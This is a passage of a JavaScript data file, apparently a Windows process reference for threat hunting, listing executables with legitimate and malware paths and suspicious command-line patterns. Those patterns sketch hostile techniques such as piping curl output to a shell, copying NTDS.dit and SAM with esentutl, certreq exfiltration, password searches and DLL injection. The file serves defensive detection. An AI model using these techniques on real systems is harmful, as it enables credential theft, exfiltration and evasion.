    notes: "Cylance endpoint protection user interface.",
    category: "security",
  },
  {
    name: "teamviewer_service.exe",
    description: "TeamViewer Remote Access Service",
    legitimatePaths: ["C:\\Program Files\\TeamViewer\\TeamViewer_Service.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\teamviewer_service.exe"],
    notes: "TeamViewer remote desktop service. Monitor for unauthorized remote access.",
    category: "remote",
    networkInfo: {
      ports: ["5938 (TeamViewer)", "443 (HTTPS)"],
      protocols: ["TCP", "UDP", "HTTPS"],
      connections: ["TeamViewer servers", "Remote systems"],
    },
  },
  {
    name: "tiworker.exe",
    description: "Windows Modules Installer Worker",
    legitimatePaths: ["C:\\Windows\\WinSxS\\*\\TiWorker.exe", "C:\\Windows\\servicing\\TiWorker.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\tiworker.exe"],
    notes: "Handles component servicing/updates; high CPU during updates can be normal.",
    category: "system",
  },
  {
    name: "turbovhelp.exe",
    description: "TurboV Help Process",
    legitimatePaths: ["C:\\Program Files (x86)\\ASUS\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\turbovhelp.exe"],
    notes: "ASUS TurboV system utility helper process.",
    category: "system",
  },
  {
    name: "uns.exe",
    description: "Intel User Notification Service",
    legitimatePaths: ["C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\uns.exe"],
    notes: "Intel Management Engine user notification service.",
    category: "system",
  },
  {
    name: "unsecapp.exe",
    description: "Sink to receive asynchronous callbacks for WMI client application",
    legitimatePaths: ["C:\\Windows\\System32\\wbem\\unsecapp.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\unsecapp.exe"],
    notes: "WMI callback sink process. Should only run from wbem directory.",
    category: "system",
  },
  {
    name: "utorrent.exe",
    description: "uTorrent BitTorrent Client",
    legitimatePaths: ["C:\\Program Files\\uTorrent\\uTorrent.exe", "C:\\Users\\*\\AppData\\Roaming\\uTorrent\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\utorrent.exe"],
    notes: "uTorrent peer-to-peer file sharing client. Monitor for policy violations.",
    category: "network",
    networkInfo: {
      ports: ["Various high ports", "6881-6889 (BitTorrent)"],
      protocols: ["TCP", "UDP", "BitTorrent"],
      connections: ["BitTorrent peers", "Tracker servers"],
    },
  },
  {
    name: "utorrentie.exe",
    description: "uTorrent Internet Explorer Integration",
    legitimatePaths: ["C:\\Program Files\\uTorrent\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\utorrentie.exe"],
    notes: "uTorrent browser integration component.",
    category: "network",
  },
  {
    name: "wltrysvc.exe",
    description: "Dell Wireless Service",
    legitimatePaths: ["C:\\Program Files\\Dell\\Dell Wireless WLAN Card\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\wltrysvc.exe"],
    notes: "Dell wireless network adapter service.",
    category: "network",
  },
  {
    name: "wshelper.exe",
    description: "Windows Shell Helper",
    legitimatePaths: ["Various system directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\wshelper.exe"],
    notes: "Generic Windows shell helper. Verify specific function and signature.",
    category: "system",
  },
  {
    name: "yourphone.exe",
    description: "Microsoft Your Phone App",
    legitimatePaths: ["C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\yourphone.exe"],
    notes: "Windows 10/11 Your Phone app for mobile device integration.",
    category: "system",
    networkInfo: {
      ports: ["443 (HTTPS)", "Various sync ports"],
      protocols: ["TCP", "HTTPS", "Bluetooth"],
      connections: ["Microsoft services", "Mobile devices"],
    },
  },
  {
    name: "regedit.exe",
    description: "Registry Editor - Windows registry editing tool",
    legitimatePaths: ["C:\\Windows\\regedit.exe", "C:\\Windows\\System32\\regedit.exe"],
    commonMalwarePaths: [
      "C:\\Users\\*\\AppData\\*\\regedit.exe",
      "C:\\Temp\\regedit.exe",
      "C:\\Windows\\Temp\\regedit.exe",
      "C:\\ProgramData\\*\\regedit.exe",
    ],
    notes:
      "Registry Editor for modifying Windows registry. Legitimate versions only in Windows directory. Often used by malware for persistence and system modification. Monitor for unauthorized registry changes.",
    category: "admin",
    networkInfo: {
      ports: ["N/A"],
      protocols: ["N/A"],
      connections: ["Local registry access only"],
    },
    commandLinePatterns: {
      legitimate: [
        "regedit.exe",
        "regedit.exe /s filename.reg",
        "regedit.exe /e filename.reg",
        "regedit.exe /a filename.reg",
      ],
      suspicious: [
        "regedit.exe /s with suspicious .reg files",
        "regedit.exe launched from temp directories",
        "regedit.exe with encoded parameters",
        "regedit.exe launched by scripts or malware",
      ],
    },
  },
  {
    name: "at.exe",
    description: "Task Scheduler Command Line Tool",
    legitimatePaths: ["C:\\Windows\\System32\\at.exe"],
    commonMalwarePaths: ["C:\\Windows\\at.exe", "C:\\Users\\*\\at.exe", "C:\\Temp\\at.exe"],
    notes: "Schedules tasks. Can be abused for persistence and lateral movement.",
    category: "admin"
  },
  {
    name: "tasklist.exe",
    description: "Task List Utility",
    legitimatePaths: ["C:\\Windows\\System32\\tasklist.exe"],
    commonMalwarePaths: ["C:\\Windows\\tasklist.exe", "C:\\Users\\*\\tasklist.exe", "C:\\Temp\\tasklist.exe"],
    notes: "Lists running processes. Commonly used for reconnaissance.",
    category: "recon"
  },
  {
    name: "sc.exe",
    description: "Service Control Manager",
    legitimatePaths: ["C:\\Windows\\System32\\sc.exe"],
    commonMalwarePaths: ["C:\\Windows\\sc.exe", "C:\\Users\\*\\sc.exe", "C:\\Temp\\sc.exe"],
    notes: "Manages Windows services. Can be abused for persistence and privilege escalation.",
    category: "admin"
  },
  {
    name: "net1.exe",
    description: "Network Command Line Utility (Legacy)",
    legitimatePaths: ["C:\\Windows\\System32\\net1.exe"],
    commonMalwarePaths: ["C:\\Windows\\net1.exe", "C:\\Users\\*\\net1.exe", "C:\\Temp\\net1.exe"],
    notes: "Legacy network utility. Can be used for reconnaissance and lateral movement.",
    category: "admin"
  },
  {
    name: "whoami.exe",
    description: "User Identity Utility",
    legitimatePaths: ["C:\\Windows\\System32\\whoami.exe"],
    commonMalwarePaths: ["C:\\Windows\\whoami.exe", "C:\\Users\\*\\whoami.exe", "C:\\Temp\\whoami.exe"],
    notes: "Displays current user information. Common reconnaissance tool.",
    category: "recon"
  },
  {
    name: "urlmon.dll",
    description: "URL Moniker Library",
    legitimatePaths: ["C:\\Windows\\System32\\urlmon.dll", "C:\\Windows\\SysWOW64\\urlmon.dll"],
    commonMalwarePaths: ["C:\\Windows\\urlmon.dll", "C:\\Users\\*\\urlmon.dll", "C:\\Temp\\urlmon.dll"],
    notes: "URL handling library. Can be hijacked for malicious purposes.",
    category: "dll"
  },
  {
    name: "mshtml.dll",
    description: "Microsoft HTML Rendering Engine",
    legitimatePaths: ["C:\\Windows\\System32\\mshtml.dll", "C:\\Windows\\SysWOW64\\mshtml.dll"],
    commonMalwarePaths: ["C:\\Windows\\mshtml.dll", "C:\\Users\\*\\mshtml.dll", "C:\\Temp\\mshtml.dll"],
    notes: "Internet Explorer HTML engine. Frequently targeted for exploitation.",
    category: "dll"
  },
  {
    name: "shell32.dll",
    description: "Windows Shell Common Dll",
    legitimatePaths: ["C:\\Windows\\System32\\shell32.dll", "C:\\Windows\\SysWOW64\\shell32.dll"],
    commonMalwarePaths: ["C:\\Windows\\shell32.dll", "C:\\Users\\*\\shell32.dll", "C:\\Temp\\shell32.dll"],
    notes: "Core Windows shell functionality. Can be hijacked for persistence.",
    category: "dll"
  },
  {
    name: "ole32.dll",
    description: "Microsoft OLE for Windows",
    legitimatePaths: ["C:\\Windows\\System32\\ole32.dll", "C:\\Windows\\SysWOW64\\ole32.dll"],
    commonMalwarePaths: ["C:\\Windows\\ole32.dll", "C:\\Users\\*\\ole32.dll", "C:\\Temp\\ole32.dll"],
    notes: "Object Linking and Embedding library. Core Windows component.",
    category: "dll"
  },
  {
    name: "dbghelp.dll",
    description: "Debug Help Library",
    legitimatePaths: ["C:\\Windows\\System32\\dbghelp.dll", "C:\\Windows\\SysWOW64\\dbghelp.dll"],
    commonMalwarePaths: ["C:\\Windows\\dbghelp.dll", "C:\\Users\\*\\dbghelp.dll", "C:\\Temp\\dbghelp.dll"],
    notes: "Debugging and symbol resolution library. Can be abused for process injection.",
    category: "dll"
  },
  {
    name: "powershell_ise.exe",
    description: "PowerShell Integrated Scripting Environment",
    legitimatePaths: ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe"],
    commonMalwarePaths: ["C:\\Windows\\powershell_ise.exe", "C:\\Users\\*\\powershell_ise.exe", "C:\\Temp\\powershell_ise.exe"],
    notes: "PowerShell IDE. Can be abused for script execution and persistence.",
    category: "lolbin"
  },
  {
    name: "procexp.exe",
    description: "Process Explorer - Advanced process and DLL viewer with real-time monitoring capabilities",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Shows detailed process information, handles, DLLs, and network connections. Legitimate admin tool but frequently used for reconnaissance and process analysis.",
    category: "sysinternals"
  },
  {
    name: "autoruns.exe",
    description: "Autoruns - Comprehensive startup program and service enumeration tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Displays all programs configured to run at system startup, including registry entries, services, and scheduled tasks. Essential for persistence detection.",
    category: "sysinternals"
  },
  {
    name: "psexec.exe",
    description: "PsExec - Remote command execution tool for running processes on remote systems",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Executes commands on remote systems using SMB. Heavily abused for lateral movement and remote code execution in enterprise environments.",
    category: "sysinternals"
  },
  {
    name: "pskill.exe",
    description: "PsKill - Process termination utility for local and remote processes",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Terminates processes by name or PID, including remote processes. Can be used to kill security software and defensive processes.",
    category: "sysinternals"
  },
  {
    name: "procmon.exe",
    description: "Process Monitor - Real-time file system, registry, and process activity monitor",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Captures real-time file system, registry, process, and thread activity. Essential for malware analysis and system troubleshooting.",
    category: "sysinternals"
  },
  {
    name: "regmon.exe",
    description: "Registry Monitor - Real-time Windows registry activity monitoring tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Monitors registry access in real-time, showing which processes are reading/writing registry keys. Useful for detecting registry-based persistence and malware behavior.",
    category: "sysinternals"
  },
  {
    name: "filemon.exe",
    description: "File Monitor - Real-time file system activity monitoring tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Monitors file system activity in real-time, showing file operations by all processes. Essential for understanding malware file behavior and data exfiltration patterns.",
    category: "sysinternals"
  },
  {
    name: "handle.exe",
    description: "Handle - Process handle enumeration and management utility",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Shows open handles (files, registry keys, processes) for all processes. Useful for troubleshooting and detecting file locks or resource conflicts.",
    category: "sysinternals"
  },
  {
    name: "tcpview.exe",
    description: "TCPView - Network connection monitoring and management tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Shows all TCP and UDP endpoints with process information. Essential for network reconnaissance and detecting suspicious network connections.",
    category: "sysinternals"
  },
  {
    name: "pslist.exe",
    description: "PsList - Enhanced process listing utility with detailed information",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Lists processes with detailed information including memory usage, CPU time, and thread counts. More comprehensive than tasklist.exe.",
    category: "sysinternals"
  },
  {
    name: "psinfo.exe",
    description: "PsInfo - System information gathering and enumeration tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Displays detailed system information including OS version, hardware specs, and installed software. Commonly used for reconnaissance and system profiling.",
    category: "sysinternals"
  },
  {
    name: "psloggedon.exe",
    description: "PsLoggedOn - User session enumeration and logon information tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Shows users logged on locally and remotely via SMB. Essential for lateral movement reconnaissance and identifying active user sessions.",
    category: "sysinternals"
  },
  {
    name: "psgetsid.exe",
    description: "PsGetSid - Security Identifier (SID) resolution and enumeration tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Resolves SIDs to account names and vice versa. Useful for privilege escalation reconnaissance and understanding account relationships.",
    category: "sysinternals"
  },
  {
    name: "accesschk.exe",
    description: "AccessChk - Access rights enumeration and permission checking utility",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Checks access rights for files, directories, registry keys, and services. Essential for privilege escalation and identifying misconfigured permissions.",
    category: "sysinternals"
  },
  {
    name: "accessenum.exe",
    description: "AccessEnum - Directory and registry access rights enumeration tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Enumerates access rights for directories and registry keys recursively. Useful for finding overly permissive access controls and privilege escalation paths.",
    category: "sysinternals"
  },
  {
    name: "adrestore.exe",
    description: "ADRestore - Active Directory object restoration and recovery tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Restores deleted Active Directory objects from the AD recycle bin. Can be abused to restore malicious accounts or objects for persistence.",
    category: "sysinternals"
  },
  {
    name: "bginfo.exe",
    description: "BGInfo - Desktop background system information display tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Displays system information on the desktop background. Generally benign but can be used for reconnaissance and system profiling.",
    category: "sysinternals"
  },
  {
    name: "diskmon.exe",
    description: "DiskMon - Disk activity monitoring and analysis tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Monitors disk activity in real-time, showing read/write operations. Useful for detecting suspicious disk access patterns and data exfiltration.",
    category: "sysinternals"
  },
  {
    name: "logonsessions.exe",
    description: "LogonSessions - Active logon session enumeration and analysis tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Lists all active logon sessions with detailed information. Essential for understanding user sessions and detecting unauthorized access.",
    category: "sysinternals"
  },
  {
    name: "ntfsinfo.exe",
    description: "NTFSInfo - NTFS volume information and metadata analysis tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Displays detailed NTFS volume information including MFT details and metadata. Useful for filesystem analysis and understanding disk structure.",
    category: "sysinternals"
  },
  {
    name: "portmon.exe",
    description: "PortMon - Serial and parallel port monitoring and debugging tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Monitors serial and parallel port activity. Useful for hardware debugging and detecting unusual port communications.",
    category: "sysinternals"
  },
  {
    name: "regdelnull.exe",
    description: "RegDelNull - Registry key deletion utility for null-terminated keys",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Deletes registry keys that contain null characters, which are difficult to remove through normal means. Can be used to clean up malicious registry entries.",
    category: "sysinternals"
  },
  {
    name: "rootkitrevealer.exe",
    description: "RootkitRevealer - Rootkit detection and hidden file/registry discovery tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Detects rootkits by comparing registry and filesystem views. Essential for finding hidden files, registry entries, and rootkit components.",
    category: "sysinternals"
  },
  {
    name: "sigcheck.exe",
    description: "SigCheck - File signature verification and hash calculation tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Verifies digital signatures and calculates file hashes. Essential for detecting unsigned executables, modified files, and verifying file integrity.",
    category: "sysinternals"
  },
  {
    name: "streams.exe",
    description: "Streams - NTFS alternate data streams detection and management tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Displays and removes NTFS alternate data streams. Essential for detecting hidden data and malware that uses ADS for concealment.",
    category: "sysinternals"
  },
  {
    name: "strings.exe",
    description: "Strings - Text string extraction and analysis tool for binary files",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Extracts readable strings from binary files. Essential for malware analysis, reverse engineering, and finding embedded URLs, IPs, or commands.",
    category: "sysinternals"
  },
  {
    name: "sync.exe",
    description: "Sync - File system cache synchronization and flush utility",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Forces cached data to be written to disk. Useful for ensuring data persistence and can be used to clear file system caches.",
    category: "sysinternals"
  },
  {
    name: "whois.exe",
    description: "WhoIs - Domain name and IP address lookup and information tool",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Performs domain name and IP address lookups. Essential for network reconnaissance and investigating suspicious domains or IPs.",
    category: "sysinternals"
  },
  {
    name: "winobj.exe",
    description: "WinObj - Windows object namespace browser and explorer",
    legitimatePaths: ["Portable executable - typically run from Downloads or custom directories"],
    commonMalwarePaths: [],
    notes: "Browses the Windows object namespace including devices, drivers, and system objects. Useful for understanding system architecture and detecting unusual objects.",
    category: "sysinternals"
  },

  // --- Missing LOLBins & Commonly Abused Executables ---
  {
    name: "bash.exe",
    description: "Windows Subsystem for Linux bash shell",
    legitimatePaths: ["C:\\Windows\\System32\\bash.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\bash.exe", "C:\\Temp\\bash.exe"],
    notes: "WSL bash shell. Increasingly used for defense evasion — allows running Linux binaries on Windows, bypassing many Windows-based security controls.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["bash.exe", "bash.exe -c 'command'", "bash.exe ~"],
      suspicious: ["bash.exe -c 'curl ... | sh'", "bash.exe -c 'python -c ...'", "bash.exe spawned by Office applications"]
    },
    parentProcesses: {
      legitimate: ["explorer.exe", "cmd.exe", "powershell.exe", "WindowsTerminal.exe"],
      suspicious: ["winword.exe", "excel.exe", "mshta.exe", "wscript.exe"]
    }
  },
  {
    name: "wsl.exe",
    description: "Windows Subsystem for Linux launcher",
    legitimatePaths: ["C:\\Windows\\System32\\wsl.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\wsl.exe", "C:\\Temp\\wsl.exe"],
    notes: "WSL launcher. Can execute arbitrary Linux commands, bypassing application whitelisting and many EDR detections.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["wsl.exe", "wsl.exe -d Ubuntu", "wsl.exe --list"],
      suspicious: ["wsl.exe -e /bin/bash -c 'curl ...'", "wsl.exe spawned by non-interactive parents"]
    }
  },
  {
    name: "pwsh.exe",
    description: "PowerShell 7/Core cross-platform shell",
    legitimatePaths: [
      "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "C:\\Program Files\\PowerShell\\7-preview\\pwsh.exe"
    ],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\pwsh.exe", "C:\\Temp\\pwsh.exe"],
    notes: "PowerShell 7 (Core). Different binary from powershell.exe (Windows PowerShell 5.1). Separate execution policy and module paths. Can bypass restrictions targeting powershell.exe.",
    category: "scripting",
    commandLinePatterns: {
      legitimate: ["pwsh.exe", "pwsh.exe -File script.ps1", "pwsh.exe -Command 'Get-Process'"],
      suspicious: ["pwsh.exe -EncodedCommand", "pwsh.exe -ep bypass -nop", "pwsh.exe -WindowStyle Hidden"]
    },
    parentProcesses: {
      legitimate: ["explorer.exe", "WindowsTerminal.exe", "code.exe"],
      suspicious: ["winword.exe", "excel.exe", "mshta.exe"]
    }
  },
  {
    name: "curl.exe",
    description: "Command-line URL transfer tool (built into Windows 10+)",
    legitimatePaths: ["C:\\Windows\\System32\\curl.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\curl.exe", "C:\\Temp\\curl.exe"],
    notes: "Built into Windows 10 1803+. Commonly used for downloading payloads, C2 communication, and data exfiltration. Watch for curl used with -o to write files or piped to cmd/powershell.",
    category: "lolbin",
    networkInfo: {
      ports: ["80", "443", "Any"],
      protocols: ["HTTP", "HTTPS", "FTP", "SFTP"],
      connections: ["Any external host"]
    },
    commandLinePatterns: {
      legitimate: ["curl.exe https://example.com", "curl.exe -o file.txt https://example.com"],
      suspicious: ["curl.exe -o C:\\Users\\*\\AppData\\*.exe", "curl.exe | cmd", "curl.exe http://<IP>:<high-port>"]
    }
  },
  {
    name: "ssh.exe",
    description: "OpenSSH client (built into Windows 10+)",
    legitimatePaths: ["C:\\Windows\\System32\\OpenSSH\\ssh.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\ssh.exe", "C:\\Temp\\ssh.exe"],
    notes: "Built-in OpenSSH client since Windows 10 1809. Can be used for tunneling, port forwarding, and lateral movement. Watch for -R (reverse tunnel) and -D (SOCKS proxy) flags.",
    category: "remote",
    networkInfo: {
      ports: ["22", "Dynamic"],
      protocols: ["SSH"],
      connections: ["Remote SSH servers"]
    },
    commandLinePatterns: {
      legitimate: ["ssh.exe user@host", "ssh.exe -i key.pem user@host"],
      suspicious: ["ssh.exe -R (reverse tunnel)", "ssh.exe -D (SOCKS proxy)", "ssh.exe -L (local forward) to internal hosts"]
    }
  },
  {
    name: "sshd.exe",
    description: "OpenSSH server daemon (built into Windows 10+)",
    legitimatePaths: ["C:\\Windows\\System32\\OpenSSH\\sshd.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\sshd.exe", "C:\\Temp\\sshd.exe"],
    notes: "OpenSSH server. If enabled, provides remote shell access. Attackers may install or enable this for persistent backdoor access.",
    category: "remote",
    networkInfo: {
      ports: ["22"],
      protocols: ["SSH"],
      connections: ["Inbound SSH connections"]
    }
  },
  {
    name: "tar.exe",
    description: "Archive utility (built into Windows 10+)",
    legitimatePaths: ["C:\\Windows\\System32\\tar.exe"],
    commonMalwarePaths: ["C:\\Temp\\tar.exe"],
    notes: "Built into Windows 10 1803+. Can be used to exfiltrate data by creating archives or to extract dropped payloads.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["tar.exe -xf archive.tar", "tar.exe -czf backup.tar.gz folder"],
      suspicious: ["tar.exe -czf used on sensitive directories", "tar.exe run by unusual parent processes"]
    }
  },
  {
    name: "finger.exe",
    description: "Finger protocol client for user information lookup",
    legitimatePaths: ["C:\\Windows\\System32\\finger.exe"],
    commonMalwarePaths: ["C:\\Temp\\finger.exe"],
    notes: "Legacy user lookup tool. Abused as a C2 data transfer mechanism — can receive commands from a remote finger server. Rarely used legitimately in modern environments.",
    category: "lolbin",
    networkInfo: {
      ports: ["79"],
      protocols: ["TCP"],
      connections: ["Remote finger servers"]
    },
    commandLinePatterns: {
      legitimate: ["finger.exe user@host"],
      suspicious: ["finger.exe used to retrieve encoded commands", "finger.exe piped to cmd or powershell"]
    }
  },
  {
    name: "certreq.exe",
    description: "Certificate Request tool for certificate enrollment",
    legitimatePaths: ["C:\\Windows\\System32\\certreq.exe"],
    commonMalwarePaths: ["C:\\Temp\\certreq.exe"],
    notes: "Certificate enrollment utility. Can be abused to download files from URLs (LOLBin). The -Post flag sends data to a URL, enabling exfiltration.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["certreq.exe -submit request.req", "certreq.exe -retrieve RequestId"],
      suspicious: ["certreq.exe -Post -config http://<URL>", "certreq.exe used to download files"]
    }
  },
  {
    name: "esentutl.exe",
    description: "Extensible Storage Engine utility for database management",
    legitimatePaths: ["C:\\Windows\\System32\\esentutl.exe"],
    commonMalwarePaths: ["C:\\Temp\\esentutl.exe"],
    notes: "ESE database utility. Can copy locked files (including NTDS.dit, SAM, SYSTEM hives) using the /y flag, bypassing file locks. Frequently used in credential theft attacks.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["esentutl.exe /d database.edb", "esentutl.exe /r logprefix"],
      suspicious: ["esentutl.exe /y /vss ntds.dit", "esentutl.exe /y C:\\Windows\\System32\\config\\SAM"]
    }
  },
  {
    name: "expand.exe",
    description: "CAB file expansion utility",
    legitimatePaths: ["C:\\Windows\\System32\\expand.exe"],
    commonMalwarePaths: ["C:\\Temp\\expand.exe"],
    notes: "Extracts CAB files. Used to drop payloads from compressed archives, bypassing some content inspection.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["expand.exe archive.cab -F:* destination"],
      suspicious: ["expand.exe extracting to temp or user directories", "expand.exe run by script engines"]
    }
  },
  {
    name: "extrac32.exe",
    description: "CAB extraction utility (legacy)",
    legitimatePaths: ["C:\\Windows\\System32\\extrac32.exe"],
    commonMalwarePaths: ["C:\\Temp\\extrac32.exe"],
    notes: "Legacy CAB extractor. LOLBin that can copy/extract files. Less monitored than expand.exe, making it attractive for attackers.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["extrac32.exe /Y source.cab /L destination"],
      suspicious: ["extrac32.exe used to copy arbitrary files", "extrac32.exe copying executables to temp paths"]
    }
  },
  {
    name: "findstr.exe",
    description: "Find String utility for searching text in files",
    legitimatePaths: ["C:\\Windows\\System32\\findstr.exe"],
    commonMalwarePaths: ["C:\\Temp\\findstr.exe"],
    notes: "Text search utility. Commonly used in post-exploitation scripts to search for credentials, passwords, and sensitive strings in files and registry exports.",
    category: "recon",
    commandLinePatterns: {
      legitimate: ["findstr.exe /S /I pattern *.txt", "findstr.exe /R regex file"],
      suspicious: ["findstr.exe /S /I password", "findstr.exe /S /I credential", "findstr.exe searching config files for keys"]
    }
  },
  {
    name: "forfiles.exe",
    description: "Batch file processing utility for selecting and executing commands on files",
    legitimatePaths: ["C:\\Windows\\System32\\forfiles.exe"],
    commonMalwarePaths: ["C:\\Temp\\forfiles.exe"],
    notes: "LOLBin that can execute arbitrary commands via /c flag. Used to bypass application whitelisting by proxy-executing commands.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["forfiles.exe /P dir /S /D -30 /C \"cmd /c del @path\""],
      suspicious: ["forfiles.exe /c \"cmd /c powershell ...\"", "forfiles.exe /c used to run downloaded payloads"]
    }
  },
  {
    name: "hh.exe",
    description: "HTML Help executable for compiled help files",
    legitimatePaths: ["C:\\Windows\\hh.exe", "C:\\Windows\\SysWOW64\\hh.exe"],
    commonMalwarePaths: ["C:\\Temp\\hh.exe"],
    notes: "Opens CHM (compiled HTML help) files. CHM files can contain embedded scripts and are a common phishing payload vector. Watch for hh.exe opening files from temp or download directories.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["hh.exe helpfile.chm"],
      suspicious: ["hh.exe C:\\Users\\*\\Downloads\\*.chm", "hh.exe C:\\Temp\\*.chm", "hh.exe opening files from email attachment paths"]
    }
  },
  {
    name: "mavinject.exe",
    description: "Microsoft Application Virtualization Injector",
    legitimatePaths: ["C:\\Windows\\System32\\mavinject.exe", "C:\\Windows\\SysWOW64\\mavinject.exe"],
    commonMalwarePaths: ["C:\\Temp\\mavinject.exe"],
    notes: "Legitimate App-V component that can inject DLLs into running processes. Abused for DLL injection attacks and defense evasion.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["mavinject.exe (rarely used directly)"],
      suspicious: ["mavinject.exe <PID> /INJECTRUNNING <DLL>", "mavinject.exe used to inject into system processes"]
    }
  },
  {
    name: "pcalua.exe",
    description: "Program Compatibility Assistant launcher",
    legitimatePaths: ["C:\\Windows\\System32\\pcalua.exe"],
    commonMalwarePaths: ["C:\\Temp\\pcalua.exe"],
    notes: "LOLBin for proxy execution. Can launch executables via -a flag, bypassing application whitelisting rules that don't monitor pcalua.exe.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["pcalua.exe (typically invoked by the OS)"],
      suspicious: ["pcalua.exe -a malware.exe", "pcalua.exe -a C:\\Temp\\payload.exe"]
    }
  },
  {
    name: "control.exe",
    description: "Windows Control Panel host",
    legitimatePaths: ["C:\\Windows\\System32\\control.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\control.exe", "C:\\Temp\\control.exe"],
    notes: "Control Panel host. Can be abused to load arbitrary CPL (DLL) files, enabling code execution through malicious Control Panel items.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["control.exe", "control.exe appwiz.cpl", "control.exe timedate.cpl"],
      suspicious: ["control.exe C:\\Temp\\malicious.cpl", "control.exe loading CPL from user directories"]
    }
  },
  {
    name: "SyncAppvPublishingServer.exe",
    description: "App-V Publishing Server synchronization utility",
    legitimatePaths: ["C:\\Windows\\System32\\SyncAppvPublishingServer.exe"],
    commonMalwarePaths: ["C:\\Temp\\SyncAppvPublishingServer.exe"],
    notes: "LOLBin that can execute arbitrary PowerShell commands. Bypasses PowerShell execution policy and constrained language mode.",
    category: "lolbin",
    commandLinePatterns: {
      legitimate: ["SyncAppvPublishingServer.exe (App-V environments only)"],
      suspicious: ["SyncAppvPublishingServer.exe \"n; Start-Process ...\"", "SyncAppvPublishingServer.exe with embedded PowerShell"]
    }
  },

  // --- Remote Access Tools (commonly abused) ---
  {
    name: "wsmprovhost.exe",
    description: "WinRM/PowerShell Remoting host process",
    legitimatePaths: ["C:\\Windows\\System32\\wsmprovhost.exe"],
    commonMalwarePaths: ["C:\\Temp\\wsmprovhost.exe"],
    notes: "Hosts incoming WinRM/PowerShell remoting sessions. Each remote session spawns a wsmprovhost.exe. Presence indicates active remote PowerShell session — investigate if unexpected.",
    category: "remote",
    networkInfo: {
